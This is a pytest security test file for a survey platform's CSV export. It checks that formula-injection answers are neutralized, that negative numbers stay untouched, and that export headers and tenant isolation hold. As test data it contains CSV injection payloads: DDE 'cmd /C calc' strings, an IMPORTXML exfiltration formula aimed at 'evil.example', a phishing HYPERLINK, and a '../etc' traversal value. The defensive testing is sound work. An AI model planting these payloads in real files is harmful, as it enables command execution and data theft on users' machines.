"""Permanent CI guard for OWASP CSV formula-injection neutralization and dataset export safety (Wave 27).

Verifies:
1. End-to-end anonymous survey submission -> authenticated dataset export (both JSON downloadCsv
   and direct ?format=csv text/csv stream): open-text answers starting with '=', '+', '@', '|',
   '\\t', '\\r', '\\n' (including leading-space bypasses) or non-decimal '-...' expressions (e.g.
   '-2+3+cmd') are 100% neutralized with a leading single quote ("'"), while internal analysis
   CSV remains lossless and deterministic.
2. Legitimate negative decimals (e.g. '-12', '-0.55', '-3.5', '-.5', numeric answers -12 / -3.5),
   positive numbers, and normal Chinese/academic text suffer 0 false-positive escaping.
3. Embedded commas, double quotes, and CRLF sequences inside adversarial cells never shift CSV
   columns when parsed back by RFC 4180 csv.reader.
4. Export endpoints enforce RFC 5987 Content-Disposition, X-Content-Type-Options: nosniff,
   Cache-Control: no-store, format parameter validation (422), and cross-tenant 404 isolation.
"""
from __future__ import annotations

import csv
from datetime import timedelta
import io
from pathlib import Path
import re
from urllib.parse import unquote
from uuid import uuid4

from fastapi.testclient import TestClient
import pytest
from sqlalchemy import create_engine, event
from sqlalchemy.pool import StaticPool

from application.services.surveys import sanitize_csv_cell, sanitize_csv_document
from evix_api.app import create_app
from infrastructure.database.models import (
    Base,
    Member,
    Project,
    Session as DbSessionModel,
    Team,
    User,
    now,
)
from infrastructure.security import keyed
from infrastructure.settings import Settings

TRUSTED_ORIGIN = "http://127.0.0.1:3180"
TEAM_A_ID = "11111111-1111-4111-8111-111111111111"
TEAM_B_ID = "22222222-2222-4222-8222-222222222222"
PROJECT_A_ID = "33333333-3333-4333-8333-333333333333"
OWNER_ID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
OUTSIDER_ID = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"

_CONTENT_DISP_RE = re.compile(
    r'^attachment; filename="([A-Za-z0-9._-]+)"; filename\*=UTF-8\'\'([A-Za-z0-9%\-._~]+)$'
)
_CHINESE_CHAR_RE = re.compile(r"[\u4e00-\u9fff]")
_FORBIDDEN_BRACKET_RE = re.compile(r"[【】「」『』]")


def _make_sqlite_engine():
    engine = create_engine(
        "sqlite://",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )

    def _on_connect(dbapi_conn, _rec):
        dbapi_conn.create_function("set_config", 3, lambda _k, val, _l: val)
        dbapi_conn.create_function("pg_advisory_xact_lock", 1, lambda _lock_id: 1)

    event.listen(engine, "connect", _on_connect)
    Base.metadata.create_all(engine)
    return engine


def _make_settings(tmp_path: Path, **overrides) -> Settings:
    payload = {
        "mode": "local_test",
        "database_url": "postgresql+psycopg://evix_user:csv_guard_pw@127.0.0.1:55432/evix_prod",
        "allowed_origins": [TRUSTED_ORIGIN],
        "invited_emails": ["owner@example.test", "outsider@example.test"],
        "auth_secret": "a1b2c3d4e5f60718293a4b5c6d7e8f90" * 2,
        "keyring": {"v1": "0f1e2d3c4b5a69788796a5b4c3d2e1f0" * 2},
        "mail_mode": "fixture",
        "provider_mode": "fixture",
        "sav_temp_dir": tmp_path / "sav-csv-guard",
        "preflight_temp_dir": tmp_path / "preflight-csv-guard",
    }
    payload.update(overrides)
    return Settings(**payload)


def _seed_workspace(engine, settings: Settings, monkeypatch) -> dict[str, tuple[str, str]]:
    ts = now().replace(tzinfo=None)
    monkeypatch.setattr("evix_api.dependencies.now", lambda: ts)
    monkeypatch.setattr("application.services.surveys.now", lambda: ts)
    monkeypatch.setattr("multi_agent.agents.survey_agent.services.surveys.now", lambda: ts)

    creds = {
        "owner": ("csv-owner-cookie-0123456789", "csv-owner-csrf"),
        "outsider": ("csv-outsider-cookie-9876543210", "csv-outsider-csrf"),
    }
    with engine.begin() as conn:
        conn.execute(
            User.__table__.insert(),
            [
                {"id": OWNER_ID, "email": "owner@example.test", "created_at": ts},
                {"id": OUTSIDER_ID, "email": "outsider@example.test", "created_at": ts},
            ],
        )
        for uid, (ck, csrf) in ((OWNER_ID, creds["owner"]), (OUTSIDER_ID, creds["outsider"])):
            conn.execute(
                DbSessionModel.__table__.insert().values(
                    user_id=uid,
                    token_hash=keyed(settings, "session/v1", ck),
                    csrf=csrf,
                    expires_at=ts + timedelta(days=30),
                    revoked_at=None,
                )
            )
        conn.execute(
            Team.__table__.insert(),
            [
                {"id": TEAM_A_ID, "name": "导出安全课题组"},
                {"id": TEAM_B_ID, "name": "外部参照课题组"},
            ],
        )
        conn.execute(
            Member.__table__.insert(),
            [
                {"team_id": TEAM_A_ID, "user_id": OWNER_ID, "role": "owner"},
                {"team_id": TEAM_B_ID, "user_id": OUTSIDER_ID, "role": "owner"},
            ],
        )
        conn.execute(
            Project.__table__.insert().values(
                id=PROJECT_A_ID,
                team_id=TEAM_A_ID,
                title="县域社区智慧助餐满意度实证调研",
                revision=1,
                questionnaire_revision=0,
                created_at=ts,
            )
        )
    return creds


def _survey_design() -> dict:
    def _q(qid: str, var: str, qtype: str, *, required: bool, **overrides) -> dict:
        base = {
            "id": qid,
            "variable": var,
            "text": f"题目_{var}",
            "type": qtype,
            "required": required,
            "purpose": "research",
            "researchQuestion": "研究问题",
            "construct": "构念",
            "analysis": "description",
            "decisionUse": "决策用途",
            "source": "自编题项",
            "choices": [
                {"code": "often", "label": "每周3次及以上"},
                {"code": "rare", "label": "每周1至2次"},
            ],
            "min": 1,
            "max": 5,
            "minLabel": "低",
            "maxLabel": "高",
            "reverse": False,
            "condition": None,
        }
        base.update(overrides)
        return base

    return {
        "schema": "questionnaire-design/v1",
        "classification": "proposed",
        "title": "县域银发助餐服务体验问卷",
        "objective": "评估服务满意度与开放建议",
        "population": "县域60岁及以上常住居民",
        "geography": "浙江省义乌市",
        "period": "2026",
        "recruitment": "分层随机抽样",
        "introduction": "感谢参与本次匿名学术调研，您的回答仅用于统计汇总分析。",
        "pilotNotes": "已完成预调查信度检验",
        "questions": [
            _q("q_choice", "dining_freq", "single", required=True),
            _q("q_delta", "temp_delta", "number", required=False, min=-50, max=50),
            _q("q_open", "open_feedback", "text", required=False),
        ],
    }


def _assert_export_headers(headers) -> str:
    assert headers.get("cache-control") == "no-store"
    assert headers.get("x-content-type-options") == "nosniff"
    assert headers.get("x-frame-options") == "DENY"
    assert headers.get("x-robots-tag") == "noindex, nofollow, noarchive"
    cd = headers.get("content-disposition", "")
    m = _CONTENT_DISP_RE.fullmatch(cd)
    assert m is not None, f"Invalid Content-Disposition header: {cd!r}"
    assert m.group(1) == "survey-dataset.csv"
    decoded = unquote(m.group(2), encoding="utf-8", errors="strict")
    assert "县域银发助餐服务体验问卷" in decoded and decoded.endswith(".csv")
    return decoded


def test_end_to_end_anonymous_formula_injection_submissions_neutralized_on_csv_export(
    tmp_path: Path, monkeypatch
):
    engine = _make_sqlite_engine()
    settings = _make_settings(tmp_path)
    creds = _seed_workspace(engine, settings, monkeypatch)
    app = create_app(settings=settings, engine=engine)

    owner_cookie, owner_csrf = creds["owner"]
    owner_headers = {"Origin": TRUSTED_ORIGIN, "X-CSRF-Token": owner_csrf}

    dangerous_open_answers = [
        "=cmd|' /C calc'!A0",
        "+SUM(1+1)*cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        '@IMPORTXML("https://evil.example/exfil","//secret")',
        "\t=1+1",
        "\r=1+1",
        '\n=HYPERLINK("https://evil.example","钓鱼链接")',
        "|cmd|' /C calc'!A0",
        "   =SUM(A1:A10)",
        "  +42",
        "  -SUM(1,2)",
    ]
    benign_submissions = [
        ("社区老年助餐食堂配送准时，菜品清淡适口。", -3.5),
        ("-12", -12),
        ("-0.55", 0),
        ("-3.5", 15.5),
        ("42", 8),
    ]

    with TestClient(app, raise_server_exceptions=False) as client:
        # 1. Owner saves questionnaire & publishes survey release
        client.cookies.set(settings.cookie_name, owner_cookie)
        q_res = client.post(
            f"/api/projects/{PROJECT_A_ID}/questionnaire/versions",
            json={"design": _survey_design(), "expectedRevision": 0, "idempotencyKey": str(uuid4())},
            headers=owner_headers,
        )
        assert q_res.status_code == 201, q_res.text

        pub_res = client.post(
            f"/api/projects/{PROJECT_A_ID}/surveys",
            json={"expectedQuestionnaireRevision": 1, "idempotencyKey": str(uuid4())},
            headers=owner_headers,
        )
        assert pub_res.status_code == 201, pub_res.text
        release = pub_res.json()
        release_id = release["id"]
        public_token = release["token"]

        # 2. Anonymous respondents submit dangerous formula-injection payloads + benign negative/CJK answers
        client.cookies.clear()
        expected_dangerous_by_id: dict[str, str] = {}
        for formula_payload in dangerous_open_answers:
            sub = client.post(
                f"/api/surveys/{public_token}/responses",
                json={
                    "idempotencyKey": str(uuid4()),
                    "answers": {"q_choice": "often", "q_delta": -3.5, "q_open": formula_payload},
                },
                headers={"Origin": TRUSTED_ORIGIN},
            )
            assert sub.status_code == 201, f"Submission failed for {formula_payload!r}: {sub.text}"
            expected_dangerous_by_id[sub.json()["id"]] = formula_payload

        expected_benign_by_id: dict[str, tuple[str, float]] = {}
        for benign_text, num_val in benign_submissions:
            sub = client.post(
                f"/api/surveys/{public_token}/responses",
                json={
                    "idempotencyKey": str(uuid4()),
                    "answers": {"q_choice": "rare", "q_delta": num_val, "q_open": benign_text},
                },
                headers={"Origin": TRUSTED_ORIGIN},
            )
            assert sub.status_code == 201, sub.text
            expected_benign_by_id[sub.json()["id"]] = (benign_text, num_val)

        # 3. Owner exports dataset (JSON envelope + direct ?format=csv download)
        client.cookies.set(settings.cookie_name, owner_cookie)
        dataset_url = f"/api/projects/{PROJECT_A_ID}/surveys/{release_id}/dataset"

        json_res = client.get(dataset_url)
        assert json_res.status_code == 200, json_res.text
        _assert_export_headers(json_res.headers)
        exported = json_res.json()
        expected_total = len(dangerous_open_answers) + len(benign_submissions)
        assert exported["rowCount"] == expected_total

        csv_stream_res = client.get(f"{dataset_url}?format=csv")
        assert csv_stream_res.status_code == 200
        assert csv_stream_res.headers.get("content-type", "").startswith("text/csv")
        _assert_export_headers(csv_stream_res.headers)
        # UTF-8 BOM prefix for Excel UTF-8 Chinese compatibility
        assert csv_stream_res.content.startswith(b"\xef\xbb\xbf")
        streamed_csv_text = csv_stream_res.content.decode("utf-8-sig")
        assert streamed_csv_text == exported["downloadCsv"]

        # 4. Parse both raw analysis CSV and sanitized downloadCsv and verify every single cell
        raw_rows = list(csv.reader(io.StringIO(exported["csv"], newline="")))
        safe_rows = list(csv.reader(io.StringIO(exported["downloadCsv"], newline="")))
        assert len(raw_rows) == expected_total + 1
        assert len(safe_rows) == expected_total + 1
        headers_row = safe_rows[0]
        assert headers_row == raw_rows[0]
        resp_id_idx = headers_row.index("__response_id")
        open_idx = headers_row.index("open_feedback")
        delta_idx = headers_row.index("temp_delta")

        raw_by_id = {r[resp_id_idx]: r for r in raw_rows[1:]}
        safe_by_id = {r[resp_id_idx]: r for r in safe_rows[1:]}

        # Every formula-injection open answer is prefixed with "'" in downloadCsv,
        # while q_delta == "-3.5" remains unquoted "-3.5", and raw analysis CSV stays lossless!
        for rid, formula_payload in expected_dangerous_by_id.items():
            assert len(safe_by_id[rid]) == len(headers_row), "CSV column count shifted on adversarial payload"
            assert raw_by_id[rid][open_idx] == formula_payload
            assert safe_by_id[rid][open_idx] == "'" + formula_payload
            assert safe_by_id[rid][delta_idx] == "-3.5"

        # Benign Chinese answers & legitimate negative numbers suffer 0 false-positive escaping
        for rid, (benign_text, num_val) in expected_benign_by_id.items():
            assert safe_by_id[rid][open_idx] == benign_text
            expected_num_str = str(int(num_val) if float(num_val).is_integer() else num_val)
            assert safe_by_id[rid][delta_idx] == expected_num_str


@pytest.mark.parametrize(
    ("raw_cell", "expected_safe"),
    [
        ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
        ("+SUM(1+1)*cmd", "'+SUM(1+1)*cmd"),
        ("+123", "'+123"),
        ("-2+3+cmd", "'-2+3+cmd"),
        ("--12", "'--12"),
        ("-1e309", "'-1e309"),
        ("-@SUM(A1)", "'-@SUM(A1)"),
        ("-.", "'-."),
        ('@IMPORTXML("https://evil.example","//a")', '\'@IMPORTXML("https://evil.example","//a")'),
        ("\t=1+1", "'\t=1+1"),
        ("\r=1+1", "'\r=1+1"),
        ("\n=1+1", "'\n=1+1"),
        ("  =1+1", "'  =1+1"),
        ("  \t=1+1", "'  \t=1+1"),
        ("|cmd", "'|cmd"),
        # Benign negative decimals, numbers, and prose must NEVER be altered
        ("-12", "-12"),
        ("-0.55", "-0.55"),
        ("-3.5", "-3.5"),
        ("-.5", "-.5"),
        ("0", "0"),
        ("3.1415", "3.1415"),
        ("", ""),
        ("   ", "   "),
        ("正常中文调研反馈（含括号与标点，无注入）", "正常中文调研反馈（含括号与标点，无注入）"),
        ("A-对照组-样本1", "A-对照组-样本1"),
    ],
)
def test_sanitize_csv_cell_and_document_owasp_matrix_and_negative_number_preservation(
    raw_cell: str, expected_safe: str
):
    assert sanitize_csv_cell(raw_cell) == expected_safe

    # Round-trip through full CSV document serializer with embedded commas & quotes
    buf = io.StringIO(newline="")
    writer = csv.writer(buf, lineterminator="\r\n")
    writer.writerow(["__response_id", "open_feedback", "score_delta"])
    writer.writerow(["resp-1", raw_cell, "-0.55"])
    sanitized_doc = sanitize_csv_document(buf.getvalue())
    parsed = list(csv.reader(io.StringIO(sanitized_doc, newline="")))
    assert parsed[0] == ["__response_id", "open_feedback", "score_delta"]
    assert parsed[1] == ["resp-1", expected_safe, "-0.55"]


def test_csv_export_format_query_validation_and_cross_tenant_header_hygiene(
    tmp_path: Path, monkeypatch
):
    engine = _make_sqlite_engine()
    settings = _make_settings(tmp_path)
    creds = _seed_workspace(engine, settings, monkeypatch)
    app = create_app(settings=settings, engine=engine)

    owner_cookie, owner_csrf = creds["owner"]
    outsider_cookie, _ = creds["outsider"]
    owner_headers = {"Origin": TRUSTED_ORIGIN, "X-CSRF-Token": owner_csrf}

    with TestClient(app, raise_server_exceptions=False) as client:
        client.cookies.set(settings.cookie_name, owner_cookie)
        client.post(
            f"/api/projects/{PROJECT_A_ID}/questionnaire/versions",
            json={"design": _survey_design(), "expectedRevision": 0, "idempotencyKey": str(uuid4())},
            headers=owner_headers,
        )
        release_id = client.post(
            f"/api/projects/{PROJECT_A_ID}/surveys",
            json={"expectedQuestionnaireRevision": 1, "idempotencyKey": str(uuid4())},
            headers=owner_headers,
        ).json()["id"]
        dataset_url = f"/api/projects/{PROJECT_A_ID}/surveys/{release_id}/dataset"

        # Unsupported export format parameter -> 422 pure Chinese error without attachment header
        for bad_fmt in ("xlsx", "xml", "parquet", "../etc"):
            bad_res = client.get(f"{dataset_url}?format={bad_fmt}")
            assert bad_res.status_code == 422
            err = bad_res.json()["error"]
            assert err["code"] == "invalid_input"
            assert _CHINESE_CHAR_RE.search(err["message"])
            assert not _FORBIDDEN_BRACKET_RE.search(err["message"])
            assert "content-disposition" not in {k.lower() for k in bad_res.headers.keys()}

        # Cross-tenant ?format=csv access -> 404 not_found with zero CSV leak
        client.cookies.set(settings.cookie_name, outsider_cookie)
        outsider_res = client.get(f"{dataset_url}?format=csv")
        assert outsider_res.status_code == 404
        assert outsider_res.json()["error"]["code"] == "not_found"
        assert "content-disposition" not in {k.lower() for k in outsider_res.headers.keys()}
